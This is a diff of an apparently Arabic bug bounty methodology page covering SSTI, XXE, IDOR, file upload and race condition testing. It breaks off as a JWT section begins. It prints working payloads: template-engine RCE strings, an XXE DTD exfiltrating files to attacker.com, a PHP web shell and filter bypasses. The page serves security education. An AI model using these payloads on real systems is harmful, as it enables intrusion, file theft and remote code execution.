+            <li>✔ <strong>Detection:</strong> حقن عمليات حسابية كلاسيكية <code>{{7*7}}</code> أو <code>${7*7}</code> أو <code>&lt;%= 7*7 %&gt;</code>. إذا أرجع السيرفر <code>49</code>، فالموقع مصاب.</li>
+            <li>✔ <strong>Engine Identification:</strong> إرسال <code>{{7*'7'}}</code>. إذا كانت النتيجة <code>7777777</code> (تكرار نصي)، المحرك غالباً Jinja2 (Python) أو Twig. أما إذا كانت النتيجة <code>49</code> (عملية حسابية رياضية)، فغالباً هو محرك جافا أو PHP.</li>
+            <li>✔ <strong>Polyglot Payloads:</strong> استخدم بايلود مدمج يغطي أغلب المحركات للكشف السريع <code>${{<%[%'"}}%\</code> لترى أخطاء السيرفر (Verbose Errors) التي تكشف نوع المحرك.</li>
+          </ul>
+        </div>
+
+        <div class="cyber-card">
+          <div class="card-header"><h3>🛠 2. الهروب من بيئة العزل (Sandbox Escaping in Python)</h3></div>
+          <p>في بيئات مثل Jinja2 أو Tornado (Python)، يتم عزل الدوال الخطيرة مثل <code>os.system</code>. الهدف هو استغلال شجرة وراثة الكائنات (Method Resolution Order - MRO) للوصول إلى كائنات النظام الأساسية:</p>
+          <div class="table-wrapper"><table class="interactive-table">
+            <thead>
+              <tr>
+                <th>الخطوة (Step)</th>
+                <th>الكود المستخدم والتفسير</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td><strong>الوصول إلى String Object</strong></td>
+                <td><code>{{ ''.__class__ }}</code><br>يعيد <code>&lt;class 'str'&gt;</code>.</td>
+              </tr>
+              <tr>
+                <td><strong>الصعود إلى Object Base</strong></td>
+                <td><code>{{ ''.__class__.__mro__[1] }}</code><br>يعيد الكلاس الأساسي <code>&lt;class 'object'&gt;</code> الذي ترث منه كل الكائنات في بايثون.</td>
+              </tr>
+              <tr>
+                <td><strong>إدراج جميع الفئات (Subclasses)</strong></td>
+                <td><code>{{ ''.__class__.__mro__[1].__subclasses__() }}</code><br>يسرد المئات من الكلاسات المتاحة في الذاكرة حالياً.</td>
+              </tr>
+              <tr>
+                <td><strong>استدعاء فئة Popen للتنفيذ (RCE)</strong></td>
+                <td>البحث عن فئة <code>subprocess.Popen</code> في القائمة (مثلاً يكون الإندكس الخاص بها 414).<br><code>{{ ''.__class__.__mro__[1].__subclasses__()[414]('id',shell=True,stdout=-1).communicate() }}</code></td>
+              </tr>
+            </tbody>
+          </table></div>
+        </div>
+
+        <div class="cyber-card">
+          <div class="card-header"><h3 style="color: var(--neon-red);"><span class="hero-icon">🚨</span> 3. محركات القوالب الأخرى (Other Template Engines)</h3></div>
+          <ul class="t-check-list">
+            <li><strong>Twig (PHP):</strong> استخدم فلتر الـ <code>map</code> أو <code>sort</code> الذي يسمح باستدعاء دوال PHP.
+              <br><em>RCE:</em> <code>{{ ['id']|filter('system') }}</code> أو <code>{{ "/etc/passwd"|file_excerpt(1,30) }}</code></li>
+            <li><strong>FreeMarker (Java):</strong> يعتمد على <code>freemarker.template.utility.Execute</code>.
+              <br><em>RCE:</em> <code>&lt;#assign ex="freemarker.template.utility.Execute"?new()&gt; ${ ex("id") }</code></li>
+            <li><strong>Velocity (Java):</strong>
+              <br><em>RCE:</em> <code>#set($x='') #set($rt=$x.class.forName('java.lang.Runtime')) #set($chr=$x.class.forName('java.lang.Character')) #set($str=$x.class.forName('java.lang.String')) #set($ex=$rt.getRuntime().exec('id')) $ex.waitFor()</code></li>
+          </ul>
+        </div>
+    
+
+<!-- MARK PHASE COMPLETE -->
         <button class="mark-complete-btn" id="complete-btn-p_ssti" onclick="markPhaseComplete('p_ssti','p_xxe')">
           ✅ Mark Phase Complete — SSTI Workflow Done → Proceed to XXE Injection
         </button>
 </div>
+      </div>
 
       <!-- Phase XXE Injection -->
       <div class="meth-content-view" id="meth-content-p_xxe" style="display: none; --tool-color: #14b8a6;">
+
         <div class="cyber-hero">
-          <h2 class="hero-title"><span class="hero-icon">🕸️</span> XML External Entity (XXE)</h2>
-          <p class="hero-tagline">مسار استغلال ثغرات معالجة ملفات XML لقراءة الملفات الداخلية للسيرفر</p>
+          <h2 class="hero-title"><span class="hero-icon">❄️</span> XML External Entity (XXE) - Deep Dive</h2>
+          <p class="hero-tagline">منهجية قراءة ملفات السيرفر عبر تعريفات الكيانات الخارجية واستغلال الـ Blind XXE OOB</p>
         </div>
 
         <div class="cyber-card">
-          <div class="card-header"><h3>💡 XXE Overview & Payloads</h3></div>
-          <p>تحدث عند تكوين محلل XML غير آمن يسمح باستدعاء كيانات خارجية بالملف.</p>
-          <div class="cmd-ui-box">
-            <div class="cmd-ui-top">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
-&lt;!DOCTYPE test [
-  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
-]&gt;
-&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;admin&lt;/password&gt;&lt;/user&gt;</div>
-            <div class="cmd-ui-bottom">
-              <button class="cmd-btn" onclick="copyText('&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;!DOCTYPE test [\n  &lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\"&gt;\n]&gt;\n&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;admin&lt;/password&gt;&lt;/user&gt;', this)">📋 Copy</button>
-            </div>
-          </div>
+          <div class="card-header"><h3>💡 1. كيفية عمل الثغرة (Mechanics)</h3></div>
+          <p>تحدث الـ XXE عندما يقوم تطبيق الويب بتحليل بيانات XML (أو ملفات تدعم XML مثل SVG أو DOCX) الواردة من المستخدم دون إيقاف تشغيل ميزة استدعاء الكيانات الخارجية (External Entities - DTDs).</p>
+          <ul class="t-check-list">
+            <li>✔ <strong>In-Band XXE:</strong> تقوم بتعريف كيان يقرأ ملفاً محلياً، ويقوم السيرفر بعرض محتوى هذا الملف مباشرة داخل استجابة الـ HTTP.</li>
+            <li>✔ <strong>Blind XXE (OOB):</strong> السيرفر يحلل الـ XML لكنه لا يطبع النتيجة في الاستجابة. لسرقة الملفات، نستخدم كيان خارجي خبيث (Malicious DTD) يُجبر السيرفر على إرسال محتوى الملف إلى سيرفرك الخاص عبر مسار الـ URL (مثال: <code>http://attacker.com/?data=[FILE_CONTENT]</code>).</li>
+            <li>✔ <strong>Billion Laughs Attack (DoS):</strong> استغلال الـ XML لعمل استهلاك هائل للذاكرة عبر تعريفات متداخلة بشكل أُسّي (Exponential).</li>
+          </ul>
         </div>
-      <div class="cyber-card" style="border: 1px solid rgba(155, 89, 255, 0.15); background: rgba(155, 89, 255, 0.02); margin-top: 20px;">
-          <div class="card-header"><h3 style="color: var(--neon-purple);"><span class="hero-icon">📂</span> Case Study: File read via XML Invoice parse</h3></div>
-          <p><strong>الوصف (Scenario):</strong> تطبيق محاسبي يسمح للمستخدم برفع فواتير بصيغة XML لمعالجتها واستخراج الإجمالي.</p>
-          <p><strong>الاستغلال (Exploitation):</strong> تعديل ملف الـ XML لحقن كيان خارجي (External Entity) يشير لملفات النظام وعرض محتواها بالصفحة.</p>
-          <p><strong>المكافأة (Bounty):</strong> <span class="text-neon-green">$3,000</span></p>
+
+        <div class="cyber-card">
+          <div class="card-header"><h3>🛡️ 2. حمولات الاستغلال المتقدمة (Advanced Payloads)</h3></div>
+          <div class="table-wrapper"><table class="interactive-table">
+            <thead>
+              <tr>
+                <th>الاستغلال (Exploit Type)</th>
+                <th>الحمولة (Payload)</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td><strong>Local File Read (In-Band)</strong></td>
+                <td><code>&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; ]&gt;<br>&lt;user&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/user&gt;</code></td>
+              </tr>
+              <tr>
+                <td><strong>SSRF via XXE</strong></td>
+                <td><code>&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "http://169.254.169.254/"&gt; ]&gt;</code><br>لاستدعاء خدمات داخلية أو Metadata.</td>
+              </tr>
+              <tr>
+                <td><strong>Blind OOB Data Exfiltration</strong></td>
+                <td>إرسال DTD خارجي: <code>&lt;!DOCTYPE foo [ &lt;!ENTITY % xxe SYSTEM "http://attacker.com/malicious.dtd"&gt; %xxe; ]&gt;</code><br><em>محتوى malicious.dtd:</em><br><code>&lt;!ENTITY % file SYSTEM "file:///etc/hostname"&gt;<br>&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'&gt;"&gt;<br>%eval;<br>%exfil;</code></td>
+              </tr>
+            </tbody>
+          </table></div>
         </div>
-      
-        <!-- MARK PHASE COMPLETE -->
+
+        <div class="cyber-card">
+          <div class="card-header"><h3 style="color: var(--neon-purple);"><span class="hero-icon">🗂️</span> 3. مسارات استغلال خفية (Hidden XXE Vectors)</h3></div>
+          <ul class="t-check-list">
+            <li><strong>Content-Type Spoofing:</strong> غيّر <code>Content-Type: application/json</code> إلى <code>Content-Type: application/xml</code> وأرسل بيانات XML. العديد من الإطارات (Frameworks) تدعم XML افتراضياً حتى لو كان الـ API مصمماً لـ JSON.</li>
+            <li><strong>File Uploads (SVG/PDF/DOCX/XLSX):</strong> ملفات أوفيس و SVG مبنية في أساسها على XML. يمكنك فك ضغط ملف <code>.xlsx</code>، تعديل ملف <code>[Content_Types].xml</code> لإضافة بايلود XXE، إعادة ضغطه ورفعه للموقع لاختراق خاصية استخراج البيانات.</li>
+            <li><strong>WAF Bypass (Encodings):</strong> الجدران النارية تبحث عن <code>&lt;!DOCTYPE</code>. يمكنك تجاوزها بتشفير محتوى الـ XML بالكامل باستخدام <code>UTF-16BE</code> أو <code>UTF-7</code>، وسيقوم محلل الـ XML بفك تشفيره وتنفيذه بينما يفشل الـ WAF في قراءته.</li>
+          </ul>
+        </div>
+    
+
+<!-- MARK PHASE COMPLETE -->
         <button class="mark-complete-btn" id="complete-btn-p_xxe" onclick="markPhaseComplete('p_xxe','p10')">
           ✅ Mark Phase Complete — XXE Injection Done → Proceed to IDOR Testing
         </button>
 </div>
+      </div>
 
       <!-- Phase 10: IDOR Testing -->
       <div class="meth-content-view" id="meth-content-p10" style="display: none; --tool-color: #10b981;">
+
         <div class="cyber-hero">
-          <h2 class="hero-title"><span class="hero-icon">🔑</span> IDOR & Access Control</h2>
-          <p class="hero-tagline">تخطي الصلاحيات والوصول لملفات فواتير وبيانات مستخدمين آخرين</p>
+          <h2 class="hero-title"><span class="hero-icon">🔑</span> Insecure Direct Object Reference (IDOR) - Deep Dive</h2>
+          <p class="hero-tagline">منهجية اكتشاف تخطي الصلاحيات، التلاعب بالمعرفات (UUIDs)، وتصعيد الامتيازات.</p>
         </div>
 
         <div class="cyber-card">
-          <div class="card-header"><h3>💡 Testing Strategy</h3></div>
-          <blockquote class="mindset-quote">"قم بالتسجيل بحسابين مختلفين (A & B). استخرج طلب حساب A من Burp Suite، وقم بتعديل الـ ID أو اسم المستخدم إلى حساب B. إذا تم تنفيذ الطلب، فهناك ثغرة IDOR مؤكدة."</blockquote>
+          <div class="card-header"><h3>💡 1. فهم الـ IDOR والأنماط المخفية</h3></div>
+          <p>تحدث الـ IDOR عندما يعرض السيرفر كائنات (Objects) للمستخدمين بناءً على معرفات (IDs) مرسلة في الطلب دون التحقق مما إذا كان المستخدم يملك صلاحية الوصول لهذا الكائن.</p>
+          <ul class="t-check-list">
+            <li>✔ <strong>Horizontal IDOR (أفقي):</strong> المستخدم (أ) يستطيع قراءة أو تعديل بيانات المستخدم (ب) الموازي له في الصلاحيات. (مثال: رؤية فواتير مستخدم آخر).</li>
+            <li>✔ <strong>Vertical IDOR (رأسي/Privilege Escalation):</strong> المستخدم العادي يرسل طلباً بتغيير صلاحياته أو استخدام نقطة نهاية (Endpoint) مخصصة للإدارة، وينجح السيرفر في تنفيذها دون التحقق من رتبة المستخدم (Admin vs User).</li>
+            <li>✔ <strong>Automated Testing:</strong> استخدم إضافات مثل <strong>Autorize</strong> في Burp Suite. قم بوضع كوكيز مستخدم ضعيف (Low-Privilege)، وتصفح الموقع بحساب الإدارة (High-Privilege). الأداة ستقوم تلقائياً بتكرار كل طلبات الإدارة بصلاحيات المستخدم الضعيف وتخبرك إذا نجح الطلب (Bypassed).</li>
+          </ul>
         </div>
-      <div class="cyber-card" style="border: 1px solid rgba(155, 89, 255, 0.15); background: rgba(155, 89, 255, 0.02); margin-top: 20px;">
-          <div class="card-header"><h3 style="color: var(--neon-purple);"><span class="hero-icon">📂</span> Case Study: Order Management BOLA/IDOR</h3></div>
-          <p><strong>الوصف (Scenario):</strong> التعديل على المعرف الرقمي للفاتورة في بوابة العميل في نظام إدارة الخدمات اللوجستية.</p>
-          <p><strong>الاستغلال (Exploitation):</strong> تغيير المعرف من 101 لـ 102 وقراءة بيانات ومواقع شحنات زبائن آخرين.</p>
-          <p><strong>المكافأة (Bounty):</strong> <span class="text-neon-green">$3,500</span></p>
+
+        <div class="cyber-card">
+          <div class="card-header"><h3>🛡️ 2. تقنيات التخطي المتقدمة (Advanced Bypasses)</h3></div>
+          <p>كيف تتخطى الحمايات وتكتشف IDORs معقدة لا تعتمد على أرقام متسلسلة (مثل `user_id=5`)؟</p>
+          <div class="table-wrapper"><table class="interactive-table">
+            <thead>
+              <tr>
+                <th>التقنية (Technique)</th>
+                <th>كيفية الاستغلال (How to Exploit)</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td><strong>1. تخطي الـ GUID/UUIDs</strong></td>
+                <td>المعرفات المعقدة مثل <code>550e8400-e29b-41d4-a716-446655440000</code> لا يمكن تخمينها. لكن يمكنك استغلال ثغرة Information Disclosure في مسارات أخرى (مثل صفحة البحث، أو ملفات الـ JS، أو استجابة API أخرى) لتسريب معرفات الضحايا ثم استخدامها في الـ IDOR Endpoint.</td>
+              </tr>
+              <tr>
+                <td><strong>2. HTTP Parameter Pollution (HPP)</strong></td>
+                <td>إذا كان السيرفر يفحص المعرف الأول ويستخدم الثاني: أرسل معرفين معاً.<br><code>GET /api/profile?id=MY_ID&amp;id=VICTIM_ID</code> أو <code>GET /api/profile?id[]=MY_ID&amp;id[]=VICTIM_ID</code>.</td>
+              </tr>
+              <tr>
+                <td><strong>3. REST to API Path Manipulation</strong></td>
+                <td>تغيير هيكل الرابط بطرق غير متوقعة. <br>إذا كان <code>GET /api/v1/users/VICTIM_ID</code> مرفوضاً (403).<br>جرب: <code>GET /api/v1/users/MY_ID/../VICTIM_ID</code> لتجاوز فلاتر المسار الأولية.</td>
+              </tr>
+              <tr>
+                <td><strong>4. Wildcard / Mass Assignment</strong></td>
+                <td>إرسال <code>*</code> أو <code>%</code> أو محاولة حقن معاملات إضافية في الـ JSON. <br><code>{"user_id":"VICTIM_ID", "role":"admin"}</code>.</td>
+              </tr>
+            </tbody>
+          </table></div>
         </div>
-      
-        <!-- MARK PHASE COMPLETE -->
+
+        <div class="cyber-card" style="border: 1px solid rgba(0, 229, 255, 0.15); background: rgba(0, 229, 255, 0.02); margin-top: 20px;">
+          <div class="card-header"><h3 style="color: var(--neon-cyan);"><span class="hero-icon">📺</span> مرجع التعلم والتطبيق (Reference)</h3></div>
+          <p>للاطلاع على تطبيقات عملية لأدوات مثل Autorize وطرق تخطي الـ UUIDs وتسريب البيانات، راجع سلسلة الباونتي العربية (Bug Bounty Arabic).</p>
+          <p>رابط قائمة التشغيل على يوتيوب: <a href="https://www.youtube.com/watch?v=0TD1mPv7jJY&list=PLEHdb4yX2v-2r8IYQT4ute8ZXDuU8XuKg" target="_blank" style="color: var(--neon-cyan); text-decoration: underline;">مبادئ وتطبيقات Bug Bounty</a></p>
+        </div>
+    
+
+<!-- MARK PHASE COMPLETE -->
         <button class="mark-complete-btn" id="complete-btn-p10" onclick="markPhaseComplete('p10','p11')">
           ✅ Mark Phase Complete — IDOR Testing Done → Proceed to File Upload Exploits
         </button>
 </div>
+      </div>
 
       <!-- Phase 11: File Upload Exploits -->
       <div class="meth-content-view" id="meth-content-p11" style="display: none; --tool-color: #f59e0b;">
+
         <div class="cyber-hero">
-          <h2 class="hero-title"><span class="hero-icon">📤</span> File Upload Exploits</h2>
-          <p class="hero-tagline">رفع ملفات خبيثة (Webshells) لتنفيذ الأوامر على خادم الهدف</p>
+          <h2 class="hero-title"><span class="hero-icon">📁</span> File Upload Exploits - Deep Dive</h2>
+          <p class="hero-tagline">منهجية تخطي فلاتر الرفع، تزوير امتدادات الملفات، والوصول إلى Remote Code Execution (RCE)</p>
         </div>
 
         <div class="cyber-card">
-          <div class="card-header"><h3>🛠️ Bypassing Extensions Filters</h3></div>
-          <p>طرق تخطي حظر رفع ملفات الـ PHP:</p>
+          <div class="card-header"><h3>💡 1. فهم فلاتر رفع الملفات وكيفية تخطيها</h3></div>
+          <p>يعتمد السيرفر عادة على عدة فلاتر للتحقق من الملف المرفوع. يجب عليك اختبارها واحدة تلو الأخرى لاكتشاف نقطة الضعف:</p>
           <ul class="t-check-list">
-            <li>✔ <strong>Alternative Extensions:</strong> رفع بصيغ بديلة مثل <code>.phtml</code> or <code>.php5</code> or <code>.phar</code>.</li>
-            <li>✔ <strong>Double Extensions:</strong> رفع باسم مثل <code>image.png.php</code>.</li>
-            <li>✔ <strong>MIME-Type bypass:</strong> تعديل الـ Content-Type في الطلب إلى <code>image/jpeg</code> بدلاً من <code>application/x-php</code>.</li>
+            <li>✔ <strong>Client-Side Filters:</strong> يتم الفحص بواسطة الجافاسكريبت في المتصفح. يمكن تخطيها بسهولة باعتراض الطلب عبر Burp Suite وتغيير الملف قبل وصوله للسيرفر.</li>
+            <li>✔ <strong>Content-Type Spoofing:</strong> السيرفر يفحص ترويسة <code>Content-Type</code> في الطلب. قم بتغييرها من <code>application/x-php</code> إلى <code>image/jpeg</code> لتمرير الملف.</li>
+            <li>✔ <strong>Extension Blacklisting Bypass:</strong> إذا كان السيرفر يمنع <code>.php</code>، جرب امتدادات بديلة ينفذها السيرفر: <code>.php3, .php4, .php5, .phtml, .phar</code> أو <code>.jspx, .jspf</code> في الجافا، أو <code>.ashx, .asmx</code> في الـ .NET.</li>
           </ul>
         </div>
-      <div class="cyber-card" style="border: 1px solid rgba(155, 89, 255, 0.15); background: rgba(155, 89, 255, 0.02); margin-top: 20px;">
-          <div class="card-header"><h3 style="color: var(--neon-purple);"><span class="hero-icon">📂</span> Case Study: PHP Webshell upload via extension bypass</h3></div>
-          <p><strong>الوصف (Scenario):</strong> تطبيق يسمح للمستخدم برفع صورته الشخصية لكنه لا يعقم الملفات المرفوعة بشكل كافٍ.</p>
-          <p><strong>الاستغلال (Exploitation):</strong> تغيير امتداد الملف لـ <code>.phtml</code> وتعديل الـ Content-Type إلى <code>image/png</code> لتنفيذ أوامر النظام RCE.</p>
-          <p><strong>المكافأة (Bounty):</strong> <span class="text-neon-green">$4,500</span></p>
+
+        <div class="cyber-card">
+          <div class="card-header"><h3>🛡️ 2. حيل التخطي المتقدمة (Advanced Bypasses)</h3></div>
+          <div class="table-wrapper"><table class="interactive-table">
+            <thead>
+              <tr>
+                <th>التقنية (Technique)</th>
+                <th>شرح الاستغلال (How it works)</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td><strong>Double Extensions</strong></td>
+                <td>رفع الملف باسم <code>shell.php.jpg</code> أو <code>shell.jpg.php</code>. يعتمد على خطأ في إعدادات السيرفر (مثل Apache AddHandler) حيث يقرأ السيرفر أول امتداد ويتجاهل الثاني، أو العكس.</td>
+              </tr>
+              <tr>
+                <td><strong>Null Byte Injection</strong></td>
+                <td>استخدام بايت فارغ لقطع السلسلة النصية: <code>shell.php%00.jpg</code>. فلاتر اللغة تعتبره صورة، بينما نظام التشغيل يقطع الاسم عند البايت الفارغ ويحفظه كـ <code>shell.php</code> (فعال في إصدارات PHP القديمة).</td>
+              </tr>
+              <tr>
+                <td><strong>Magic Bytes (File Signatures)</strong></td>
+                <td>السيرفر يفحص أول بايتات من الملف للتأكد من نوعه. أضف بايتات الصورة الوهمية في بداية كود الـ PHP الخاص بك: <br><code>GIF89a;<br>&lt;?php system($_GET['cmd']); ?&gt;</code></td>
+              </tr>
+              <tr>
+                <td><strong>Overwriting Config Files</strong></td>
+                <td>رفع ملف <code>.htaccess</code> خبيث (في Apache) لتوجيه السيرفر لتنفيذ ملفات الصور كأنها PHP: <br><code>AddType application/x-httpd-php .jpg</code><br>ثم ارفع الـ Web Shell باسم <code>shell.jpg</code> وسيعمل بنجاح.</td>
+              </tr>
+            </tbody>
+          </table></div>
         </div>
-      
-        <!-- MARK PHASE COMPLETE -->
+
+        <div class="cyber-card">
+          <div class="card-header"><h3 style="color: var(--neon-purple);"><span class="hero-icon">🖼️</span> 3. استغلال ثغرات مكتبات الصور (Image Processing Vulns)</h3></div>
+          <ul class="t-check-list">
+            <li><strong>ImageTragick (CVE-2016-3714):</strong> إذا كان الموقع يستخدم ImageMagick لتعديل الصور، ارفع ملف صورة يحتوي على كود استغلال لتشغيل أوامر نظامية أثناء معالجة الصورة.</li>
+            <li><strong>ExifTool/Metadata:</strong> حقن بايلود XSS أو Command Injection في بيانات وصف الصورة (Exif Data) مثل <code>exiftool -Comment='&lt;script&gt;alert(1)&lt;/script&gt;' image.jpg</code>، وعندما يعرض الموقع هذه البيانات، يتم تنفيذ البايلود.</li>
+            <li><strong>Polyglot Files:</strong> إنشاء ملف صالح كصورة وصالح كسكربت جافاسكريبت/PHP في نفس الوقت لتجاوز أدق فلاتر معالجة الصور المتقدمة.</li>
+          </ul>
+        </div>
+    
+
+<!-- MARK PHASE COMPLETE -->
         <button class="mark-complete-btn" id="complete-btn-p11" onclick="markPhaseComplete('p11','p12')">
           ✅ Mark Phase Complete — File Upload Exploits Done → Proceed to Race Conditions
         </button>
 </div>
+      </div>
 
       <!-- Phase 12: Race Conditions -->
       <div class="meth-content-view" id="meth-content-p12" style="display: none; --tool-color: #f43f5e;">
+
         <div class="cyber-hero">
-          <h2 class="hero-title"><span class="hero-icon">⚡</span> Race Conditions</h2>
-          <p class="hero-tagline">استغلال العمليات المتزامنة في معالجة طلبات الويب لتخطي حدود الاستخدام</p>
+          <h2 class="hero-title"><span class="hero-icon">⚡</span> Race Conditions - Deep Dive</h2>
+          <p class="hero-tagline">منهجية التلاعب بالزمن المتزامن، هجمات الـ Single-Packet، وتخطي حدود العمليات المسموحة</p>
         </div>
 
         <div class="cyber-card">
-          <div class="card-header"><h3>⚙️ Multi-request attack scenario</h3></div>
-          <p>إرسال طلبات متزامنة بكوبونات الخصم أو سحب المبالغ المالية بأجزاء من المايكروثانية باستخدام Burp Suite Turbo Intruder.</p>
+          <div class="card-header"><h3>💡 1. فهم ثغرات حالة السباق (Concurrency Flaws)</h3></div>
+          <p>تحدث هذه الثغرة عندما يقوم السيرفر بمعالجة عدة طلبات متزامنة (Concurrent Requests) تتشارك نفس الموارد (כقاعدة البيانات أو رصيد الحساب) دون عمل "إقفال" (Locking) صحيح للمتغيرات. نتيجة لذلك، تتداخل المعاملات.</p>
+          <ul class="t-check-list">
+            <li>✔ <strong>Limit Overrun:</strong> تجاوز الحد المسموح. (مثال: استخدام كوبون خصم واحد 50 مرة في نفس اللحظة للحصول على خصم ضخم).</li>
+            <li>✔ <strong>Time-of-check to time-of-use (TOCTOU):</strong> السيرفر يتحقق من الرصيد (الخطوة 1)، وقبل أن يخصم الرصيد (الخطوة 2)، يتلقى طلباً آخر وراءه مباشرة. ينجح كلا الطلبين برصيد لا يكفي إلا لطلب واحد!</li>
+          </ul>
         </div>
-      <div class="cyber-card" style="border: 1px solid rgba(155, 89, 255, 0.15); background: rgba(155, 89, 255, 0.02); margin-top: 20px;">
-          <div class="card-header"><h3 style="color: var(--neon-purple);"><span class="hero-icon">📂</span> Case Study: Shopify double coupon discount</h3></div>
-          <p><strong>الوصف (Scenario):</strong> التلاعب بالعمليات المتزامنة لاستخدام كوبون خصم وحيد الاستعمال عدة مرات.</p>
-          <p><strong>الاستغلال (Exploitation):</strong> إرسال 50 طلباً متزامناً بالمايكروثانية باستخدام Burp Suite Turbo Intruder، مما جعل قاعدة البيانات تقبل الكود مكرراً.</p>
-          <p><strong>المكافأة (Bounty):</strong> <span class="text-neon-green">$3,000</span></p>
+
+        <div class="cyber-card">
+          <div class="card-header"><h3>🛠️ 2. تقنية الـ Single-Packet Attack (المزامنة القصوى)</h3></div>
+          <p>في الماضي كنا نستخدم Burp Intruder وعدد كبير من الـ Threads. لكن المشكلة أن زمن انتقال الشبكة (Network Latency) كان يفسد التزامن. الآن نستخدم <strong>HTTP/2 Single-Packet Attack</strong>:</p>
+          <div class="table-wrapper"><table class="interactive-table">
+            <thead>
+              <tr>
+                <th>الفرق</th>
+                <th>Traditional Attack (Intruder)</th>
+                <th>Single-Packet Attack (HTTP/2)</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td><strong>آلية الإرسال</strong></td>
+                <td>يتم إرسال كل طلب في TCP Packet منفصلة، مما يسبب تأخير بأجزاء من الثانية بين كل طلب.</td>
+                <td>في بروتوكول HTTP/2، يمكن تجميع 20-30 طلباً معاً، وإرسال جميع الطلبات <strong>في حزمة شبكة واحدة (TCP Packet)</strong> لتصل السيرفر في اللحظة ذاتها بالمايكرو ثانية.</td>
+              </tr>
+              <tr>
+                <td><strong>نسبة النجاح</strong></td>
+                <td>ضعيفة جداً، وتعتمد على صدفة التوقيت وسرعة الاتصال.</td>
+                <td>شبه مؤكدة (100% Synchronization) لتخطي أدق آليات الحماية.</td>
+              </tr>
+              <tr>
+                <td><strong>الأداة المفضلة</strong></td>
+                <td>Turbo Intruder القديم.</td>
+                <td>Burp Suite Repeater (Send Group in Parallel) المدمجة حديثاً.</td>
+              </tr>
+            </tbody>
+          </table></div>
         </div>
-      
-        <!-- MARK PHASE COMPLETE -->
+
+        <div class="cyber-card">
+          <div class="card-header"><h3 style="color: var(--neon-purple);"><span class="hero-icon">🔄</span> 3. سيناريوهات استغلال معقدة (Multi-Endpoint Race Conditions)</h3></div>
+          <ul class="t-check-list">
+            <li><strong>تفعيل الحساب قبل الدفع (Bypassing Payment Flow):</strong> <br>طلب (أ): شراء منتج (معلق بانتظار الدفع).<br>طلب (ب): إلغاء الطلب المتبوع باسترداد المبلغ.<br>سباق الطلبين قد يؤدي لاسترداد مبلغ لم تقم بدفعه أساساً بسبب تداخل العمليات.</li>
+            <li><strong>تخطي توثيق الـ 2FA (Multi-Step Bypass):</strong><br>طلب (أ): طلب رمز 2FA جديد.<br>طلب (ب): التحقق برمز قديم قبل أن يتم إبطاله من قاعدة البيانات.</li>
+          </ul>
+        </div>
+    
+
+<!-- MARK PHASE COMPLETE -->
         <button class="mark-complete-btn" id="complete-btn-p12" onclick="markPhaseComplete('p12','p14')">
           ✅ Mark Phase Complete — Race Conditions Done → Proceed to JWT Hacking
         </button>
 </div>
+      </div>
 
       <!-- Phase 14: JWT Hacking -->
       <div class="meth-content-view" id="meth-content-p14" style="display: none; --tool-color: #d946ef;">
+
         <div class="cyber-hero">
-          <h2 class="hero-title"><span class="hero-icon">🎫</span> JWT Hacking Playbook</h2>
-          <p class="hero-tagline">مسار التلاعب المتقدم رموز الـ JSON Web Tokens وتخطي التواقيع الأمنية</p>
+          <h2 class="hero-title"><span class="hero-icon">🎫</span> JSON Web Tokens (JWT) - Deep Dive</h2>
+          <p class="hero-tagline">منهجية تزوير التوقيعات، كسر التشفير، واستغلال ترويسات الـ JWK و JKU لتخطي التوثيق</p>
         </div>
 
         <div class="cyber-card">
-          <div class="card-header"><h3>🗺️ JWT Attack Pipeline Flowchart (انقر للتفاصيل)</h3></div>
-          <div class="flow-visualization">
-            <div class="flow-node active-stage" onclick="inspectNode('JWT Step 1: Decode Token', 'فك ترميز التوكن (Base64) لمراجعة البيانات والـ claims والخورازمية.')">1. Decode Token</div>
-            <div class="flow-arrow">➔</div>
-            <div class="flow-node" onclick="inspectNode('JWT Step 2: Analyze Algorithm', 'تحديد نوع خوارزمية التشفير المستخدمة وثقة الخادم بها.')">2. Analyze Algorithm</div>
-            <div class="flow-arrow">➔</div>
-            <div class="flow-node" onclick="inspectNode('JWT Step 3: Weak Secret Cracking', 'التخمين على المفتاح السري محلياً إذا كان ضعيفاً باستخدام Hashcat.')">3. Weak Secret</div>
-            <div class="flow-arrow">➔</div>
-            <div class="flow-node" onclick="inspectNode('JWT Step 4: None Algorithm Bypass', 'تغيير خوارزمية التشفير بالهيدر إلى none وحذف التوقيع بالكامل.')">4. None Algorithm</div>
-            <div class="flow-arrow">➔</div>
-            <div class="flow-node" onclick="inspectNode('JWT Step 5: Key Confusion Attack', 'التلاعب بـ RS256 العام للتوقيع كـ HS256 متماثل باستخدام المفتاح العام.')">5. Key Confusion</div>
-            <div class="flow-arrow">➔</div>
-            <div class="flow-node" onclick="inspectNode('JWT Step 6: Expired Token Bypass', 'التعديل على حقل exp لطلب تخطي انتهاء صلاحية التوكن القديم.')">6. Expired Bypass</div>
-          </div>
-          
-          <div id="jwt-inspector" class="node-inspector">
-            <div class="node-inspector-title" id="jwt-inspector-title">Active Node Details</div>
-            <p id="jwt-inspector-desc">Select a node above to inspect details and workflows.</p>
-          </div>
+          <div class="card-header"><h3>💡 1. أساسيات الـ JWT وأخطاء التكوين (Core Configuration Flaws)</h3></div>
+          <p>يتكون الـ JWT من 3 أجزاء (Header.Payload.Signature). يعتمد أمانه كلياً على التوقيع الرقمي لمنع التلاعب. إذا قمت بتغيير <code>"role":"user"</code> إلى <code>"admin"</code> سيصبح التوقيع غير صالح. لكن يمكن تخطيه عبر:</p>
+          <ul class="t-check-list">
